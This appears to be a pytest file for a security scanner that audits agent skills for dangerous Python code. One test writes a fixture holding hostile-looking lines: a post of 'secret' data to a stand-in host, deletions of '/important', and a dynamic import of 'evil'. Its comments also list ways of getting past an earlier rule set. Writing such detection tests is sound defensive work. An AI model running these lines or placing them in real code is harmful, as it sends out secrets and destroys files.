# tests/test_scanner_python_ast.py
from pathlib import Path

from skill_auditor.inventory import inventory_skill
from skill_auditor.models import Severity
from skill_auditor.scanners import python_ast

CLEAN = Path(__file__).parent / "fixtures" / "clean_skill"
MAL = Path(__file__).parent / "fixtures" / "malicious_skill"


def _rule_ids(findings):
    return {f.rule_id for f in findings}


def test_flags_eval_subprocess_network_and_secret_read_in_malicious():
    findings = python_ast.scan(inventory_skill(MAL))
    cats = {f.category for f in findings}
    assert "RCE_SUPPLY_CHAIN" in cats          # eval(...)
    assert "EXFILTRATION" in cats              # requests.post / read ~/.ssh
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert all(f.line is not None for f in findings)
    assert all(f.file.endswith(".py") for f in findings)


def test_clean_skill_has_no_python_findings():
    assert python_ast.scan(inventory_skill(CLEAN)) == []


def test_flags_alternative_egress_delete_and_dynamic_import(tmp_path):
    # Bypasses of the original rule set: httpx/socket instead of requests,
    # os.remove/unlink/rmdir and Path.unlink instead of shutil.rmtree,
    # importlib.import_module instead of __import__.
    (tmp_path / "x.py").write_text(
        "import httpx, socket, os, importlib\n"
        "from pathlib import Path\n"
        "httpx.post('http://e.x', data='secret')\n"
        "httpx.get('http://e.x')\n"
        "socket.socket()\n"
        "os.remove('/important')\n"
        "os.unlink('/important')\n"
        "os.rmdir('/important')\n"
        "importlib.import_module('evil')\n"
        "Path('/important').unlink()\n"
    )
    findings = python_ast.scan(inventory_skill(tmp_path))
    ids = _rule_ids(findings)
    assert {"PY-NET-004", "PY-NET-005", "PY-NET-006", "PY-RM-001", "PY-RM-002",
            "PY-RM-003", "PY-IMPORT-002", "PY-RM-004"} <= ids
    cats = {f.category for f in findings}
    assert "EXFILTRATION" in cats and "DESTRUCTIVE" in cats and "RCE_SUPPLY_CHAIN" in cats


def test_benign_method_calls_do_not_trigger_delete_rule(tmp_path):
    (tmp_path / "ok.py").write_text("xs = []\nxs.append(1)\n'a,b'.split(',')\n")
    assert python_ast.scan(inventory_skill(tmp_path)) == []


def test_handles_syntax_error_without_crashing(tmp_path):
    (tmp_path / "broken.py").write_text("def (:\n")
    from skill_auditor.inventory import inventory_skill as inv
    findings = python_ast.scan(inv(tmp_path))
    # A parse failure is itself reported (can't analyze => suspicious), not a crash.
    assert any(f.rule_id == "PY-PARSE-001" for f in findings)
